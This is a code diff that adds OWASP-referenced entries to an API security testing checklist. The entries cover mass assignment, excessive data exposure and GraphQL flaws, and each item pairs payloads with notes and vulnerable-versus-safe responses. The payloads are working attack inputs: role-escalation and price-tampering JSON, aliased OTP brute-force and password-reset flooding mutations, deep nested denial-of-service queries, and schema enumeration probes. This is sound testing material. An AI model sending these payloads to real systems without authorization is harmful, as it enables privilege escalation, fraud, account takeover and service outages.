@@ -872,4 +872,115 @@ export const apiCategories: ChecklistCategory[] = [
       },
     ],
   },
+  {
+    id: "api-bopla",
+    reference: "https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/",
+    name: "Broken Object Property Level Authorization (BOPLA)",
+    emoji: "🔐",
+    description: "Mass assignment and excessive data exposure where property-level access controls are missing.",
+    items: [
+      {
+        id: "api-bopla-1",
+        text: "Mass Assignment of Administrative or Financial Properties",
+        how: "Inject sensitive property keys (isAdmin, role, balance, verified, credit_limit, tenant_id) into PUT/POST/PATCH JSON payloads.",
+        payloads: [
+          "PATCH /api/v1/users/me\nContent-Type: application/json\n\n{\"name\": \"John\", \"is_admin\": true, \"role\": \"superadmin\"}",
+          "PUT /api/v1/subscription\nContent-Type: application/json\n\n{\"plan\": \"free\", \"status\": \"active\", \"expires_at\": \"2099-12-31\", \"discount\": 100}",
+          "POST /api/v1/orders\nContent-Type: application/json\n\n{\"item_id\": 42, \"quantity\": 1, \"price\": 0.01, \"total\": 0.01}"
+        ],
+        payloadNotes: [
+          "Privilege elevation property injection: tests if the backend ORM blindly binds request JSON keys directly into the User model without a schema whitelist/DTO.",
+          "Subscription tamper payload: tests if payment status and expiration date properties can be forged directly through client update requests.",
+          "Price override injection: tests if the order endpoint accepts client-supplied pricing rather than recalculating server-side."
+        ],
+        expectedResponse: {
+          vulnerable: "The server persists the injected properties, elevating the user's role to superadmin, granting free subscriptions, or accepting tampered prices.",
+          safe: "The backend ignores unauthorized properties or rejects the request with a 400/422 validation error."
+        },
+        severity: "critical"
+      },
+      {
+        id: "api-bopla-2",
+        text: "Excessive Data Exposure in Object Serialization",
+        how: "Intercept GET responses for user profiles, order summaries, or team lists and inspect if backend models return internal properties omitted from the UI.",
+        payloads: [
+          "GET /api/v1/users/123",
+          "GET /api/v1/teams/current/members",
+          "Inspect JSON response for: password_hash, auth_token, internal_id, ssn, stripe_customer_id, role, deleted_at"
+        ],
+        payloadNotes: [
+          "Full model serialization check: backend frameworks (Rails, Django, Express/Sequelize, Spring) often serialize the entire database entity by default.",
+          "Check team member list: public endpoints displaying usernames often accidentally return all team members' email addresses, phone numbers, and permission bits."
+        ],
+        expectedResponse: {
+          vulnerable: "API responses contain sensitive fields that the client UI hides or filters, leaking confidential user or organization data.",
+          safe: "The API uses explicit Data Transfer Objects (DTOs) or field projection, returning only the minimum properties necessary for the requested view."
+        },
+        severity: "high"
+      }
+    ]
+  },
+  {
+    id: "api-graphql-modern",
+    reference: "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/12-API_Testing/01-Testing_GraphQL",
+    name: "Modern GraphQL Deep Testing",
+    emoji: "🕸️",
+    description: "Circular query exhaustion, alias-based rate limit bypass, and schema discovery without introspection.",
+    items: [
+      {
+        id: "api-gql-alias-1",
+        text: "Alias-Based Rate Limit and Batching Bypass",
+        how: "Pack dozens or hundreds of aliased mutations into a single GraphQL HTTP request to bypass per-request rate limiters on login, OTP, or gift card redemption.",
+        payloads: [
+          "mutation {\n  m1: verifyOtp(code: \"1001\") { token }\n  m2: verifyOtp(code: \"1002\") { token }\n  m3: verifyOtp(code: \"1003\") { token }\n  m4: verifyOtp(code: \"1004\") { token }\n}",
+          "mutation {\n  a1: resetPassword(email: \"victim@target.com\") { status }\n  a2: resetPassword(email: \"victim@target.com\") { status }\n  # repeated 100 times\n}"
+        ],
+        payloadNotes: [
+          "Aliased OTP brute-force: sends multiple execution queries in one HTTP POST; WAFs counting HTTP requests will see only 1 request while backend executes all aliased mutations.",
+          "Bulk trigger / email bomb: tests if rate limiters enforce action limits at the GraphQL resolver level or only at the HTTP gateway level."
+        ],
+        expectedResponse: {
+          vulnerable: "The server processes all aliased operations in a single HTTP transaction, successfully brute-forcing pins or sending multiple automated messages.",
+          safe: "The GraphQL server enforces query complexity scoring, limits the maximum number of aliased fields/directives, or rate limits at the resolver function."
+        },
+        severity: "high"
+      },
+      {
+        id: "api-gql-dos-1",
+        text: "Circular / Deep Nested Query Denial of Service",
+        how: "Send a recursive nested query that exploits circular schema relationships (e.g., author -> posts -> author -> posts) to exhaust server CPU and memory.",
+        payloads: [
+          "query {\n  user(id: 1) {\n    friends {\n      friends {\n        friends {\n          friends {\n            friends { id name }\n          }\n        }\n      }\n    }\n  }\n}",
+          "query {\n  posts(limit: 100) {\n    author {\n      posts(limit: 100) {\n        author {\n          posts(limit: 100) { id title }\n        }\n      }\n    }\n  }\n}"
+        ],
+        payloadNotes: [
+          "Deep recursion query: tests if the GraphQL server enforces maximum query depth (e.g. max depth 5-7).",
+          "Combinatorial explosion: combining limit parameters with circular relationships triggers exponential database joins (N+1 query problem)."
+        ],
+        expectedResponse: {
+          vulnerable: "The backend server takes seconds/minutes to respond, consumes 100% CPU, or crashes with an Out of Memory error.",
+          safe: "The GraphQL engine rejects the query before execution with 'Query depth exceeds maximum permitted limit'."
+        },
+        severity: "high"
+      },
+      {
+        id: "api-gql-clairvoyance",
+        text: "Schema Enumeration via Field Suggestions (Clairvoyance)",
+        how: "When Introspection (__schema) is disabled, exploit GraphQL's 'Did you mean ...?' field suggestion feature to reconstruct the full schema.",
+        payloads: [
+          "query { usr { id } } # Server responds: 'Cannot query field usr. Did you mean user?'",
+          "query { user { pass } } # Server responds: 'Cannot query field pass. Did you mean password, passwordHash, or pastOrders?'"
+        ],
+        payloadNotes: [
+          "Field suggestion harvesting: GraphQL engines by default suggest valid field names when an invalid field is queried.",
+          "Automated tool Clairvoyance / Graphw00f uses this feedback loop to map out the entire private GraphQL schema even when introspection is turned off."
+        ],
+        expectedResponse: {
+          vulnerable: "The error messages suggest hidden administrative fields, internal mutations, and proprietary data models.",
+          safe: "Field suggestions are disabled in production configurations, returning only generic 'Cannot query field' errors."
+        },
+        severity: "medium"
+      }
+    ]
+  }
 ];
